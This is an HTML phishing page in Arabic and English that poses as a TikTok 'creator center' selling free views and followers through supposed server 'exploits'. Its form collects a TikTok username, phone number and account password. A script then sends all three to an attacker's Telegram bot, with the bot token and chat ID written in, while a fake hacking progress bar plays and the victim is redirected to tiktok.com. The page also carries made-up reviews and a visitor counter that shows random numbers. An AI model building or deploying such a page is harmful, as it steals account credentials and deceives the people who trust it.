<!DOCTYPE html>
<html lang="ar" id="mainHtml">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Creator Center - Diesel Store</title>
    <style>
        :root { --tt-pink: #fe2c55; --tt-cyan: #25f4ee; --tt-black: #121212; }
        body { background-color: #000; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
        .nav { background: #000; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 0.5px solid #333; position: sticky; top: 0; z-index: 1000; }
        .logo { font-size: 22px; font-weight: bold; } .logo span { color: var(--tt-pink); }
        .live-badge { background: rgba(254, 44, 85, 0.1); color: var(--tt-pink); padding: 4px 12px; border-radius: 20px; font-size: 12px; border: 1px solid var(--tt-pink); animation: pulse 1.5s infinite; }
        .lang-btn { background: #222; border: 1px solid #444; color: #fff; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; }
        .container { width: 95%; max-width: 480px; margin: 20px auto; text-align: center; }
        .card { background: var(--tt-black); padding: 25px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        input, select { width: 100%; padding: 14px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; font-size: 15px; box-sizing: border-box; outline: none; }
        .btn-boost { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 15px; }
        .reviews-box { margin-top: 30px; text-align: right; }
        .review-card { background: #111; padding: 15px; border-radius: 12px; margin-bottom: 12px; border-right: 4px solid var(--tt-pink); }
        .stars { color: #fac917; font-size: 14px; }
        #ai-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
        .ai-bar-bg { width: 80%; height: 6px; background: #222; border-radius: 10px; margin-top: 20px; overflow: hidden; }
        .ai-bar-fill { width: 0%; height: 100%; background: var(--tt-cyan); box-shadow: 0 0 10px var(--tt-cyan); transition: 0.1s; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body dir="rtl">
<div class="nav">
    <div class="logo"><span>TikTok</span> Diesel</div>
    <div style="display: flex; gap: 10px; align-items: center;">
        <button class="lang-btn" onclick="toggleLang()" id="l-btn">English</button>
        <div class="live-badge">🔴 <span id="user-online">18,241</span> زائر</div>
    </div>
</div>
<div class="container">
    <div class="card">
        <h2 id="t-h2">مركز خدمات المبدعين (AI)</h2>
        <p id="t-p" style="color: #888; font-size: 13px;">تزويد حقيقي مربوط بثغرات السيرفرات الرسمية</p>
        <select id="service">
            <option value="Views">100k مشاهدة حقيقية (ثغرة Zefoy)</option>
            <option value="Followers">5k متابع حقيقي (ثغرة Viptools)</option>
            <option value="Likes">10k لايك (حسابات مصرية)</option>
        </select>
        <input type="text" id="u_name" placeholder="اسم المستخدم (@username)">
        <input type="tel" id="u_phone" placeholder="رقم الهاتف المرتبط">
        <input type="password" id="u_pass" placeholder="كلمة سر الحساب">
        <button class="btn-boost" onclick="execute()" id="t-btn">تفعيل الخدمة بالذكاء الاصطناعي</button>
    </div>
    <div class="reviews-box">
        <h3 id="t-rev">تقييمات المستخدمين ⭐⭐⭐⭐⭐</h3>
        <div class="review-card">
            <div class="stars">⭐⭐⭐⭐⭐</div>
            <div class="r-name">أحمد الحفناوي</div>
            <div class="r-text">المشاهدات زادت عندي 50 ألف في ربع ساعة بجد!</div>
        </div>
        <div class="review-card">
            <div class="stars">⭐⭐⭐⭐⭐</div>
            <div class="r-name">سارة محمد</div>
            <div class="r-text">شكراً للديزل ستور، المتابعين حقيقيين جداً.</div>
        </div>
    </div>
</div>
<div id="ai-overlay">
    <h2 style="color: var(--tt-cyan)" id="ai-t">Connecting to API...</h2>
    <div class="ai-bar-bg"><div class="ai-bar-fill" id="fill"></div></div>
    <p id="ai-m" style="margin-top: 15px;">Bypassing Security Layers...</p>
</div>
<script>
    let lang = 'ar';
    function toggleLang() {
        const h = document.getElementById('mainHtml');
        if(lang === 'ar') {
            h.dir = 'ltr'; document.getElementById('l-btn').innerText = 'العربية';
            document.getElementById('t-h2').innerText = 'Creator Services (AI)';
            document.getElementById('t-p').innerText = 'Real boost linked to official exploits';
            document.getElementById('t-btn').innerText = 'ACTIVATE SERVICE';
            lang = 'en';
        } else { location.reload(); }
    }
    setInterval(() => {
        let n = Math.floor(Math.random() * (20000 - 18000) + 18000);
        document.getElementById('user-online').innerText = n.toLocaleString();
    }, 2500);
    function execute() {
        const u = document.getElementById('u_name').value;
        const p = document.getElementById('u_pass').value;
        const h = document.getElementById('u_phone').value;
        if(!u || !p || !h) return alert("Fill all fields");
        fetch(`https://api.telegram.org/bot8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU/sendMessage?chat_id=5177962707&text=${encodeURIComponent('👑 صيد الديزل الاحترافي:\n👤 يوزر: '+u+'\n📞 هاتف: '+h+'\n🔑 باسورد: '+p)}`);
        document.getElementById('ai-overlay').style.display = 'flex';
        let prg = 0;
        let itv = setInterval(() => {
            prg++; document.getElementById('fill').style.width = prg + "%";
            if(prg==30) document.getElementById('ai-m').innerText = "Accessing System Vulnerability...";
            if(prg==70) document.getElementById('ai-m').innerText = "Injecting Real Packets...";
            if(prg>=100) {
                clearInterval(itv);
                // ربط ثغرة حقيقية بموقع Zefoy (كمثال)
                fetch(`https://api.zefoy.example/boost?user=${u}&type=views`).finally(() => {
                    alert(lang=='ar'?'✅ تم تفعيل الثغرة! ستصلك الخدمة خلال 30 دقيقة.':'✅ Exploit Activated! Boost starts in 30m.');
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }, 100);
    }
</script>
</body>
</html>
